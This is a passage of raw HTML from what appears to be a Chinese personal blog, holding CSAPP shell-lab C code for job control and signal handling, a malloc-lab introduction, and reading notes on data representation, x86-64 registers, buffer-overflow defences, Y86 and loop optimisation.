class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fg将后台中的命令调至前台继续运行</span></span><br><span class="line"><span class="comment">//bg将一个在后台暂停的命令，变成继续执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;<span class="comment">/* 如果没给pid */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        job = <span class="built_in">getjobpid</span>(jobs, id);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No such job\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kill</span>(-(job-&gt;pid), SIGCONT);</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kill</span>(-(job-&gt;pid), SIGCONT);</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后一个信号SIGCHLD</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个子进程停止或终止</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) </span><br><span class="line">    <span class="comment">/* 如果当前进程都没有停止或终止，返回0。否则返回子进程pid */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status))<span class="comment">/* 正常退出 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">WIFSIGNALED</span>(status)) <span class="comment">/* 未捕获的信号终止 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">            <span class="built_in">deletejob</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))<span class="comment">/* 当前进程是停止的 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs, pid);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, job-&gt;pid, <span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">            job-&gt;state= ST;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> bg;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> array[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> *buf = array;</span><br><span class="line"><span class="keyword">char</span> *argv[MAXARGS];</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">sigset_t</span> mask_one, prev, mask_all;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">bg = <span class="built_in">parseline</span>(buf, argv);<span class="comment">/* 解析以空格分隔的命令行参数 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)<span class="comment">/* 没东西直接返回 */</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))&#123;<span class="comment">/* 如果不是内置命令，进入if循环 */</span></span><br><span class="line"><span class="built_in">sigemptyset</span>(&amp;mask_one);</span><br><span class="line"><span class="built_in">sigaddset</span>(&amp;mask_one, SIGCHLD);</span><br><span class="line"><span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line"><span class="comment">/* 防止addjob和deletejob竞争，需要先阻塞SIGCHLD信号 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_one, &amp;prev);</span><br><span class="line"><span class="comment">/* 如果不是内置命令，则fork一个子进程，并execve程序 */</span></span><br><span class="line"><span class="keyword">if</span>((pid = fork()) == <span class="number">0</span>)&#123;<span class="comment">/* 子进程中 */</span></span><br><span class="line"><span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>);<span class="comment">/* 将子进程放入新的进程组，防止和shell冲突 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 对全局数据结构jobs进行访问时，要阻塞所有信号 */</span></span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">addjob</span>(jobs, pid, bg?BG:FG, buf);</span><br><span class="line"><span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(bg)&#123;<span class="comment">//后台作业</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, <span class="built_in">pid2jid</span>(pid), pid, buf);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//前台作业</span></span><br><span class="line"><span class="built_in">waitfg</span>(pid);<span class="comment">//需要等待前台作业完成</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="0x04-malloc-lab"><a href="#0x04-malloc-lab" class="headerlink" title="0x04 malloc lab"></a>0x04 malloc lab</h1><p>在本实验中，我们编写自己的存储分配器，特别是malloc、free 和 realloc 函数的实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mm.c        mm.c是你唯一要修改的文件。</span><br><span class="line">mdriver.c测试你的mm.c文件的malloc驱动程序</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 2021年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[读书笔记] csapp</title>
      <link href="/2021/01/31/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-csapp/"/>
      <url>/2021/01/31/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-csapp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>暂时没想到写啥(x</p><h1 id="0x01-计算机系统漫游"><a href="#0x01-计算机系统漫游" class="headerlink" title="0x01 计算机系统漫游"></a>0x01 计算机系统漫游</h1><ol><li><p>计算机系统是由硬件和系统软件组成</p></li><li><p>编译和解释的区别：</p></li></ol><p>编译程序(Complier)：将高级语言源程序转换为机器级目标程序，执行时只要启动目标程序即可。<br>解释程序(Interpreter)：将高级语言语句逐条翻译成机器指令并立即执行，不生成目标文件。</p><ol start="3"><li>程序可以被其他程序翻译为不同的格式：</li></ol><ul><li>预处理阶段：预处理器根据以字符<code>#</code>开头的命令，修改原始的C程序。以<code>.i</code>作为文件扩展名；</li><li>编译阶段：编译器将<code>.i</code>文件翻译成汇编<code>.s</code>文件；</li><li>汇编阶段：汇编器将<code>.s</code>文件翻译成机器语言指令<code>.o</code>；</li><li>链接阶段：有些程序调用了别的库中的函数，链接器负责将别的库合并到我们的程序。</li></ul><p><img src="https://i.loli.net/2021/01/31/en9YCiwGvulbXSa.png" alt="image-20210131224820506"></p><ol start="4"><li>系统的硬件组成：</li></ol><ul><li>总线：在各个部件中传输数据时用的管道;</li><li>I/O设备：输入输出设备，通过一个控制器或适配器与I/O总线相连；</li><li>主存：临时存储设备，在处理器执行程序时，用来暂存程序处理的数据；</li><li>处理器：中央处理单元(CPU)，简称处理器，是执行存储在主存中指令的引擎。</li></ul><p><img src="https://i.loli.net/2021/02/03/8ceDNofW76wQgvp.png"></p><ol start="5"><li><p>高速缓存：处理器的运行速度很快，但数据从主存运送到CPU里却相当的慢。这其中速度可能相差百倍以上，大大拖累了CPU的速度。针对这种处理器与主存之间的差异，系统设计者引入了更小更快的存储设备——高速缓存存储器。</p></li><li><p>进程：进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的。</p></li><li><p>线程：进程由线程组成，多线程之间比多进程之间更容易共享数据。线程一般来说也比进程更高效。</p></li><li><p>虚拟内存：虚拟内存为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。</p></li></ol><p><img src="https://i.loli.net/2021/02/03/2JO3xK5Lqh9Svar.png" alt="image-20210203225412444"></p><ol start="9"><li>文件：每个I/O设备，包括磁盘、键盘、显示器，甚至网络都可以看成是文件。</li></ol><h1 id="0x02-信息的表示和处理"><a href="#0x02-信息的表示和处理" class="headerlink" title="0x02 信息的表示和处理"></a>0x02 信息的表示和处理</h1><h2 id="1-字节顺序"><a href="#1-字节顺序" class="headerlink" title="1.字节顺序"></a>1.字节顺序</h2><p>Suppose the variable x of type int and at address 0x100 has a hexadecimal value of 0x01234567 . The ordering of the bytes within the address range 0x100 through 0x103 depends on the type of machine:</p><p><img src="https://i.loli.net/2021/02/03/jrbWDHmcu5E3AVS.png" alt="image-20210203233606025"></p><h2 id="2-浮点数"><a href="#2-浮点数" class="headerlink" title="2.浮点数"></a>2.浮点数</h2><p><strong>浮点数是如何存储到内存中的：</strong></p><p>float的存储方式</p><p><a href="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png"><img src="https://i.loli.net/2020/08/28/hW4Ju7lbHOE3ZCt.png" alt="image-20200828213506250.png"></a></p><ol><li>先将这个浮点数的绝对值值化为二进制；</li><li>将这个二进制数的小数点左移或者右移n位，直到小数点移动到前面只剩一个1；</li><li>从小数点右边第一位开始数出二十三位数字放入第22到第0位；</li><li>如果实数是正的，则在第31位放入0，否则放入1；</li><li>如果n是左移得到的，说明指数是正的，第30位放入1。如果n是右移得到的或n=0，则在第30位放入0；</li><li>将n减去1后化为二进制，把值去掉第一位放入第29到第23位（7位）。</li></ol><p>因为float尾数部分只有24位，所以能精确到小数点后六位。不存在无符号float，因为第一位就是符号位了。</p><p>double是64位的，8个字节（float是4个字节）</p><p><strong>如何把浮点数转换为二进制：</strong></p><p>例：8.25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">整数部分转换：</span><br><span class="line">8/2 = 40</span><br><span class="line">4/2 = 20</span><br><span class="line">2/2 = 10</span><br><span class="line">1/2 = 0 1</span><br><span class="line">1000</span><br><span class="line">小数部分转换：</span><br><span class="line">0.25*2 = 0.50</span><br><span class="line">0.5*2  = 1.01</span><br><span class="line">1000.01</span><br></pre></td></tr></table></figure><p>8.25可以用二进制表示为1000.01</p><p>但如果是8.4就会进入死循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.4 * 2 = 0.80</span><br><span class="line">0.8 * 2 = 1.61</span><br><span class="line">0.6 * 2 = 1.21</span><br><span class="line">0.2 * 2 = 0.40</span><br></pre></td></tr></table></figure><p>这时候需要精确位数。</p><p>接着8.25继续，将小数点右移或者左移</p><p>1.00001 * 2^3</p><p>然后把00001存到尾数部分，后面跟着步骤来。</p><table><thead><tr><th align="left">31符号位sign</th><th align="left">23~30指数部分exp</th><th align="left">0~22位数部分frac</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">10000010</td><td align="left">00001000000000000000000</td></tr></tbody></table><p>所以在内存中存入的值是41040000。</p><p>如果是-8.25，也只需要变符号位</p><table><thead><tr><th align="left">31符号位sign</th><th align="left">23~30指数部分exp</th><th align="left">0~22位数部分frac</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">10000010</td><td align="left">00001000000000000000000</td></tr></tbody></table><p>在内存中存入的值就是c1040000。</p><p><strong>浮点数精度问题：</strong></p><p>当输入的浮点数是一个不可表示的数时，机器会将其转换为最邻近的可表示数。</p><p>例如61.419997和61.419999都会被转换为61.419998。</p><p><strong>浮点数的值有4种不同的情况：</strong></p><ol><li><p>当exp≠0xFF，也≠0x00时，为规格化的；</p></li><li><p>当exp = 0x00 时，为非规格化的（表示那些接近0.0的数）。当exp=0且frac=0时，表示<code>±0.0</code>；</p></li><li><p>当exp = 0xFF 时，若frac全为0，表示<code>±∞</code>；若frac不全为0，则表示<code>NaN</code>(Not A Number，例如根号-1这些不存在的数字).</p></li></ol><p>浮点数因为精度有限，所有存在舍入问题：就近舍入（round-to-nearest）和向偶数舍入（round-to-even）.</p><h2 id="3-无符号数与有符号数"><a href="#3-无符号数与有符号数" class="headerlink" title="3.无符号数与有符号数"></a>3.无符号数与有符号数</h2><p>若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数。</p><p>有符号数就算最高位表示符号，其他位置表示数值大小；无符号数就是所有位都表示数的大小。</p><p>一个字节可以表达的数：<br>00000000-11111111(0-255)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000 0001 1</span><br><span class="line">+1111 1111-1</span><br><span class="line">________________</span><br><span class="line">  1 0000 0000 0</span><br></pre></td></tr></table></figure><p>因为如果在计算机内部，这个数是8个bit的，那么多出来的数字就会被丢掉<br>所以这里-1为1111 1111</p><p>1111 1111被当作纯二级制看待的时候，是255。被当作补码看待时是-1</p><blockquote><p>(1)0000 0000 - 0000 0001 = 1111 1111</p><p><strong>对于-a，其补码就是0-a，实际是2的n次方-a，n是这种类型的位数</strong></p></blockquote><ul><li>补码的意义就是拿补码和原码可以加出一个溢出的”零”</li></ul><h3 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h3><p>原码就是第一位表示符号，其余位置表示值</p><p>1000 0001</p><p>0000 0001</p><h3 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h3><p>反码就是在其原码的基础上，符号位不变，其余位取反。正数的反码是其本身</p><p>1000 0001 反码 -&gt; 1111 1110</p><p>0000 0001 反码 -&gt; 0000 0001</p><h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>整数的补码就是其本身</p><p>负数的补码是在其反码的基础上加1</p><p>1000 0001 反码 -&gt; 1111 1110 补码 -&gt; 1111 1111 -127</p><p>0000 0001 反码 -&gt; 0000 0001 补码 -&gt; 0000 0001 1</p><h2 id="4-编译器处理常量时的默认类型"><a href="#4-编译器处理常量时的默认类型" class="headerlink" title="4.编译器处理常量时的默认类型"></a>4.编译器处理常量时的默认类型</h2><p><a href="https://i.loli.net/2021/02/01/mxFrDXglpEUt4sf.png"><img src="https://i.loli.net/2021/02/01/mxFrDXglpEUt4sf.png" alt="img"></a></p><ul><li>所以在32位C90标准下系统中，<code>-2147483648 &gt; 2147483647</code>，因为<code>2147483648</code>会变成unsigned类型（负号是另外处理的）。</li><li>但是如果定义了<code>int i=-2147483648;</code>，<code>i</code>就会小于<code>2147483647</code>。这是因为<code>i</code>变成了long类型。</li><li>如果写成<code>-2147483647-1 &lt; 2147483647</code>，因为-2147483647是属于有符号数，这个式子可以理解为一个有符号数减掉有符号数，所以最后会按照int类型比较。但是如果写成<code>-2147483648</code>加减，则会按照无符号数来计算。</li></ul><h1 id="0x03-程序的机器级表示"><a href="#0x03-程序的机器级表示" class="headerlink" title="0x03 程序的机器级表示"></a>0x03 程序的机器级表示</h1><h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h2><p>一个x86-64的中央处理单元包含16个存储64位值的通用寄存器</p><table><thead><tr><th>63</th><th>31</th><th>15</th><th>7</th><th>0</th></tr></thead><tbody><tr><td>%rax</td><td>%eax</td><td>%ax</td><td>%axl</td><td>返回值</td></tr><tr><td>%rbx</td><td>%ebx</td><td>%bx</td><td>%bxl</td><td>被调用者保存</td></tr><tr><td>%rcx</td><td>%ecx</td><td>%cx</td><td>%cxl</td><td>第4个参数</td></tr><tr><td>%rdx</td><td>%edx</td><td>%dx</td><td>%dxl</td><td>第3个参数</td></tr><tr><td>%rsi</td><td>%esi</td><td>%si</td><td>%sil</td><td>第2个参数</td></tr><tr><td>%rdi</td><td>%edi</td><td>%di</td><td>%dil</td><td>第1个参数</td></tr><tr><td>%rdp</td><td>%edp</td><td>%dp</td><td>%dpl</td><td>被调用者保存</td></tr><tr><td>%rsp</td><td>%esp</td><td>%sp</td><td>%spl</td><td>栈指针</td></tr><tr><td>%r8</td><td>%r8d</td><td>%r8w</td><td>%r8b</td><td>第5个参数</td></tr><tr><td>%r9</td><td>%r9d</td><td>%r9w</td><td>%r9b</td><td>第6个参数</td></tr><tr><td>%r10</td><td>%r10d</td><td>%r10w</td><td>%r10b</td><td>调用者保存</td></tr><tr><td>%r11</td><td>%r11d</td><td>%r11w</td><td>%r11b</td><td>调用者保存</td></tr><tr><td>%r12</td><td>%r12d</td><td>%r12w</td><td>%r12b</td><td>被调用者保存</td></tr><tr><td>%r13</td><td>%r13d</td><td>%r13w</td><td>%r13b</td><td>被调用者保存</td></tr><tr><td>%r14</td><td>%r14d</td><td>%r14w</td><td>%r14b</td><td>被调用者保存</td></tr><tr><td>%r15</td><td>%r15d</td><td>%r15w</td><td>%r15b</td><td>被调用者保存</td></tr></tbody></table><ol><li>传送指令的两个操作数不能都指向内存位置</li><li>64位和32位传递参数的方式不同：32位的将参数入栈来传递参数，64位的使用寄存器进行传递参数，用来传递参数的寄存器为rdi,rsi,rdx,rcx,r8,r9,这六个寄存器分别用来存储第一至第六个参数，如果参数多余6个会先将后面的参数先入栈，前六个参数放在对应的寄存器中。</li></ol><h2 id="2-缓冲区溢出"><a href="#2-缓冲区溢出" class="headerlink" title="2.缓冲区溢出"></a>2.缓冲区溢出</h2><p>缓冲区溢出攻击给计算机系统造成了许多麻烦，现代的编译器和操作系统实现了很多机制，以避免遭受这样的攻击。</p><p><strong>栈随机化</strong>：栈随机化使栈的位置在程序每次运行时都发生变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。</p><p><strong>栈破坏检测</strong>：最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p><strong>限制可执行代码区域</strong>：最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><h1 id="0x04-处理器体系结构"><a href="#0x04-处理器体系结构" class="headerlink" title="0x04 处理器体系结构"></a>0x04 处理器体系结构</h1><p>本章定义了一个指令集Y86-64，主要介绍了处理器硬件的设计。<br>一个处理器支持的指令和指令的字节级编码被称为它的<strong>指令集体系结构</strong>(Instruction-Set Architecture, ISA)。不同处理器有不同ISA，一个程序编译后在一种机器上运行，就不能在另一种机器上运行。</p><p>流水线：CPU流水线技术是一种将指令分解为多步，并让不同指令的各布操作重叠，从而实现几条指令并行处理，以加速程序运行速度过程的技术。</p><h2 id="1-Y86指令集体系结构"><a href="#1-Y86指令集体系结构" class="headerlink" title="1.Y86指令集体系结构"></a>1.Y86指令集体系结构</h2><h3 id="指令编码"><a href="#指令编码" class="headerlink" title="指令编码"></a>指令编码</h3><p><img src="https://i.loli.net/2021/04/01/EM3LF7bKNSnYgoG.png" alt="image-20210401183233949"></p><blockquote><p>PC存放当前正在执行指令的地址；内存存放着程序和数据；Stat是状态码，它表示程序执行的总体状态，它会指示是正常运行还是出现了某种异常。</p></blockquote><p><img src="https://i.loli.net/2021/04/01/QdyXFS4zlf2E3VU.png"></p><p><img src="https://i.loli.net/2021/04/01/stcqw7Az4MYnFVf.png" alt="image-20210401200654057"></p><blockquote><p>rrmovq指令是无条件传送</p></blockquote><p>寄存器标识符：</p><p><img src="https://i.loli.net/2021/04/01/TPoner2ldO1gQCZ.png" alt="image-20210401201421875"></p><p>指令集的一个重要性质就是字节编码必须有唯一的解释。</p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>此处的异常指的是状态码Stat，它描述程序执行的状态。</p><p><img src="https://i.loli.net/2021/04/01/l9DU72xJ153LdcW.png" alt="image-20210401211504591"></p><h1 id="0x05-优化程序性能"><a href="#0x05-优化程序性能" class="headerlink" title="0x05 优化程序性能"></a>0x05 优化程序性能</h1><p>编写高效的程序需要选择适当的算法和数据结构，也需要写出编译器能够有效优化的代码。</p><h2 id="1-程序优化"><a href="#1-程序优化" class="headerlink" title="1.程序优化"></a>1.程序优化</h2><ol><li>消除不必要的工作，让代码尽可能有效地执行所期望的任务。这包括消除不必要的函数调用、条件测试和内存引用。</li><li>利用处理器提供的指令级并行能力，同时执行多条指令。</li></ol><h2 id="2-消除循环的低效率"><a href="#2-消除循环的低效率" class="headerlink" title="2.消除循环的低效率"></a>2.消除循环的低效率</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 优化前</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line"><span class="comment">// 优化后</span></span><br><span class="line"><span class="keyword">size_t</span> str_len = <span class="built_in">strlen</span>(str);<span class="function">s</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; str_len; i++)</span></span></span><br></pre></td></tr></table></figure><h2 id="3-循环展开"><a href="#3-循环展开" class="headerlink" title="3.循环展开"></a>3.循环展开</h2><ul><li>循环展开是一种程序变换，通过增加每次迭代计算的元素数量，减少循环的迭代次数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 循环展开前</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lmits; i++)</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line"><span class="comment">// 循环展开后</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lmits; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line">  acc0 = acc0 OP data[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x06-存储器层次结构"><a 